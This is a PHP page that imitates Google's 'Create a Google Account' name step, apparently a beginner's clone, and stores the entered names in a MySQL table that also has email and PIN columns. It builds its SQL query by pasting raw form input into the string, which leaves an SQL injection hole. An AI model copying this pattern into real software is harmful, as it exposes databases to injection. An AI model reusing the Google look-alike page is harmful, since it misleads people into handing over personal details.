<?php
include "db.php";
?>
<html>
    <head><title>GOOGLE FORM</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
   
<style>
   body{
            background: #cfbcbc;
}
    .title {
  font-family: "Arial", sans-serif;
  font-size: 20px;
  font-weight: bold;
  white-space:nowrap;
}

.text {
  font-family: "Verdana", sans-serif;
  font-size: 16px;
  white-space:nowrap;
}
     .box1{
        font-size:20px;
        line-height:4px;
        padding-left:400px;
        padding-top:60px;
    }
     
    input[type="text"] {
      padding: 8px;
      width: 500px;
      height: 40px;
      margin-bottom: 10px;
    }

    input[type="submit"] {
      margin-top: 80px;
      padding: 4px 25px;
      margin-left:360px;
      background-color: #dcc2d3;
      border: 2px solid #671f4b;
    }
.container{
  background-color: #ebe2e2;
  display: flex;
  width: 1200px;
  height: 200;
  margin-top: 100px;
   margin-left: 40px;
  padding: 90px;
   border-radius: 8px;
  box-shadow: 0 4px 10px rgba(0,0,0,0.1);
}
select{
    margin-top:30px;
    margin-left:90px;
    background-color: #dcc2d3;
}
.footer{
  margin-left: 900px;
}
</style> 
</head>
    <body>
        <form action="" method="post">
             <div class="container">
        <div class="box">
           <i class="fa-brands fa-google" style="font-size: 100px; color: #5f458a;"></i><br><br>
  <span class="title">Create a Google Account</span><br><br>
  <span class="text">Enter your name</span>
</div>
     <div class="box1">
        <input type="text" name="Name" placeholder="First name" required><br>
        <input type="text" name="Lname" placeholder="Last name (optional)"><br>
    <input type="submit" name="next" value="next">
</div></div>
<select>
    <option>English (United state)</option>
    <option>Hindi</option>
 </select>
 <div class="footer" >
  Help &nbsp; &nbsp; Privacy &nbsp; &nbsp; Terms
</div>
</form>
<?php
 if(isset($_POST['next']))
  {
 $Namess = $_POST['Name'];
$Lname = $_POST['Lname']; 
 $sql="INSERT INTO record(Email,Username,Pin,Namess,Lname,Gender,DOB) values('','','','$Namess','$Lname','','')";
if (mysqli_query($conn, $sql)) {
  header("Location: p2.php?Name=".$Namess."&Lname=".$Lname);
        exit;
    } else {
        echo "Error: " . mysqli_error($conn);
    }
  }
?>
    </body>
</html>